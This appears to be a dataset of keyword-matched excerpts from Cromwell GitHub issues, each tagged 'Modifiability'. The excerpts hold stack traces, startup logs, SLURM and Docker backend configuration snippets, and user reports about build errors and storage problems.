Modifiability,well.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:83); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:136); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:306); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:300); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:300); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:47); 	at cromwell.core.retry.R,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1950:3639,Config,ConfigAsyncJobExecutionActor,3639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1950,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,well.sh[110916]: at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:794); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(Config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:2128,config,config,2128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['config'],['config']
Modifiability,what was the scenario that caused the failure (so we can reproduce)? bad credential for a remote db? botched config?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-230869079:109,config,config,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-230869079,1,['config'],['config']
Modifiability,"which is in conflict with the SPECs [here](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#optional-inputs-with-defaults). I'm getting this error when using WDL version 1.0 (draft-3). The error occurs in both cromwell version 33 and 34. Full stacktrace:; ```; 2018-07-24 09:54:27,543 cromwell-system-akka.dispatchers.backend-dispatcher-53 ERROR - DispatchedConfigAsyncJobExecutionActor [UUID(514f031f)AlignStar.star:NA:1]: Error attempting to Execute; java.lang.Exception: Failed command instantiation; at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:536); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:471); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:265); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:264); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:141); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:140); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:124); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionAct",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:1497,Config,ConfigAsyncJobExecutionActor,1497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5408,config,configurations,5408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configurations']
Modifiability,"with database db.url = jdbc:hsqldb:mem:094e8bf9-be0f-4d7c-854a-0cf1a15dc0d7;shutdown=false;hsqldb.tx=mvcc; [2019-01-07 16:21:16,40] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-01-07 16:21:16,42] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-01-07 16:21:16,62] [info] Running with database db.url = jdbc:hsqldb:mem:2efc8123-f7e8-4fe3-abed-48d1bcf8eb97;shutdown=false;hsqldb.tx=mvcc; [2019-01-07 16:21:17,27] [info] Slf4jLogger started; [2019-01-07 16:21:17,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-231ef13"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-01-07 16:21:17,87] [info] Metadata summary refreshing every 2 seconds.; [2019-01-07 16:21:17,94] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-01-07 16:21:18,00] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-01-07 16:21:18,02] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-01-07 16:21:19,53] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-01-07 16:21:19,58] [info] SingleWorkflowRunnerActor: Version 36; [2019-01-07 16:21:19,61] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-01-07 16:21:19,69] [info] Unspecified type (Unspecified version) workflow 18de8166-5f29-4288-9fa4-6741565446fd submitted; [2019-01-07 16:21:19,74] [info] SingleWorkflowRunnerActor: Workflow submitted [38;5;2m18de8166-5f29-4288-9fa4-6741565446fd[0m; [2019-01-07 16:21:19,75] [info] 1 new workflows fetched; [2019-01-07 16:21:19,77] [info] WorkflowManagerActor Starting workflow [38;5;2m18de8166-5f29-4288-9fa4-6741565446fd[0m; [2019-01-07 16:21:19,77] [info] WorkflowManagerActor Successfully started WorkflowActor-18de8166-5f29-4288-9fa4-6741565446fd; [2019-01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526:1660,config,configured,1660,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526,1,['config'],['configured']
Modifiability,"work bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages on disk are buckets of row values. MySQL accesses the disk at the granularity of a page, it can't fetch just a single value. Therefore, fetching some data from a page (MySQL filtering) versus all data from a page (client-side filtering) does not make a difference in the number of pages read. This is supported by the graph. It would also appear that filtering in memory, whether on client or server, does not have much of a CPU cost at all either for Cromwell nor for MySQL, because we do not see MySQL doing any less work nor Cromwell doing any more. I think this is because once a set of rows is already in memory (after reading a page or receiving the rows over the wire) choosing specific ones is trivial. For MySQL, finding and loading the pages into memory is the hard part.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:1920,variab,variable,1920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,1,['variab'],['variable']
Modifiability,"xception: Migration failed for change set changesets/resync_engine_schema.xml::restore_auto_increment_call_caching_hash_entry_id_postgresql::kshakir:; Reason: liquibase.exception.DatabaseException: ERROR: syntax error at or near ""as""; Position: 73 [Failed SQL: alter sequence ""CALL_CACHING_HASH_ENTRY_CALL_CACHING_HASH_ENTRY_ID_seq"" as bigint]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:637); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:53); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.Liquibase.update(Liquibase.java:202); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:67); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:39); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:156); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: ERROR: syntax error at or near ""as""; Position: 73 [Failed SQL: alter sequence ""CALL_CACHING_HASH_ENTRY_CALL_CACHING_HASH_ENTRY_ID_seq"" as bigint]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:356); 	at liquibase.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5083:35986,Enhance,EnhancedSqlDatabase,35986,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5083,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"xecuted `sbt assembly` to create the `womtool.jar` following [the document](https://cromwell.readthedocs.io/en/develop/WOMtool/). Below is the log. The full log is [here](https://gist.github.com/junaruga/2264c715606deee88b40de0de4e7a1b0) on the latest develop branch <54fed3e172e2138cd956c0b9663c05a8a5d34dbc>. ```; $ sbt assembly; ...; [error] /home/jaruga/git/broadinstitute/cromwell/cloud-nio/cloud-nio-spi/src/main/scala/cloud/nio/spi/UnixPath.scala:72:7: `override` modifier required to override concrete member:; [error] <defaultmethod> def isEmpty(): Boolean (defined in trait CharSequence; [error] def isEmpty: Boolean = path.isEmpty; [error] ^; [error] one error found; ...; [error] /home/jaruga/git/broadinstitute/cromwell/centaur/src/main/scala/centaur/api/DaemonizedDefaultThreadFactory.scala:17:26: method getSecurityManager in class System is deprecated; [error] private val s = System.getSecurityManager; [error] ^; [error] one error found; ...; ```. ## My environment. <!-- Which backend are you running? -->. * Fedora Linux 36. ```; $ java --version ; openjdk 17.0.4 2022-07-19; OpenJDK Runtime Environment (Red_Hat-17.0.4.0.8-1.fc36) (build 17.0.4+8); OpenJDK 64-Bit Server VM (Red_Hat-17.0.4.0.8-1.fc36) (build 17.0.4+8, mixed mode, sharing). $ scala --version; Scala code runner version 2.13.8 -- Copyright 2002-2021, LAMP/EPFL and Lightbend, Inc. $ sbt --version; WARNING: A terminally deprecated method in java.lang.System has been called; WARNING: System::setSecurityManager has been called by sbt.TrapExit$ (file:/home/jaruga/.sbt/boot/scala-2.12.14/org.scala-sbt/sbt/1.5.5/run_2.12-1.5.5.jar); WARNING: Please consider reporting this to the maintainers of sbt.TrapExit$; WARNING: System::setSecurityManager will be removed in a future release. sbt version in this project: 	1.5.5; sbt script version: 1.7.1; ```. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6902:2378,config,configuration,2378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6902,1,['config'],['configuration']
Modifiability,xecution.callcaching.FetchCachedResultsActor.$anonfun$new$2(FetchCachedResultsActor.scala:32); at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); at scala.collection.Iterator.foreach(Iterator.scala:944); at scala.collection.Iterator.foreach$(Iterator.scala:944); at scala.collection.AbstractIterator.foreach(Iterator.scala:1432); at scala.collection.IterableLike.foreach(IterableLike.scala:71); at scala.collection.IterableLike.foreach$(IterableLike.scala:70); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableLike.map(TraversableLike.scala:234); at scala.collection.TraversableLike.map$(TraversableLike.scala:227); at scala.collection.AbstractTraversable.map(Traversable.scala:104); at cromwell.engine.workflow.lifecycle.execution.callcaching.FetchCachedResultsActor.$anonfun$new$1(FetchCachedResultsActor.scala:32); at cromwell.engine.workflow.lifecycle.execution.callcaching.FetchCachedResultsActor.$anonfun$new$1$adapted(FetchCachedResultsActor.scala:30); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; I,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4023:2117,adapt,adapted,2117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4023,1,['adapt'],['adapted']
Modifiability,xecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:954); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:946); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:4474,Config,ConfigAsyncJobExecutionActor,4474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"xecutions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:5167,config,config,5167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['config'],['config']
Modifiability,"xisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationAct",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4162,config,config,4162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\""]: exit status 1 (standard error: \""error pulling image configuration: error parsing HTTP 400 response body: invalid character '<' looking for beginning of value: \\\""<?xml version='1.0' encoding='UTF-8'?><Error><Code>UserProjectMissing</Code><Message>Bucket is a requester pays bucket but no user project provided.</Message><Details>Bucket is Requester Pays bucket but no billing project id provided for non-owner.</Details></Error>\\\""\\n\"")"",`. I understand that the issue is that the Google bucket where the docker is located is requester pays and Cromwell does not know what to do in this case, but it is not immediately clear what I should do to fix it. It would be a great improvement if Cromwell could interpret this response and provide a more informative error message so that the user could immediately know what needs to be addressed. In particular, I am not fully sure what I should be doing. These are excerpts from my configuration file:; ```; ...; engine {; filesystems {; gcs {; auth = ""service-account""; project = ""xxx""; }; }; }; ...; services {; MetadataService {; ...; config {; carbonite-metadata-service {; filesystems {; gcs {; auth = ""service-account""; }; }; ...; }; }; }; }; ...; backend {; default = PAPIv2. providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory""; config {; project = ""xxx""; ...; filesystems {; gcs {; auth = ""service-account""; project = ""xxx""; ...; }; }; ...; }; }; }; }; ...; ```; Where should the configuration for telling Cromwell which project to use when pulling dockers be?. I also do not understand why this issue arises at all as the Google bucket with the dockers is a us multi-region bucket and the computation is in us-central1, so there should be no egress costs when pulling the docker and therefore no need for a billing project. Clearly I am not understanding this problem entirely. I would be grateful for a clarification. Thank you!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235:1457,config,config,1457,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235,3,['config'],"['config', 'configuration']"
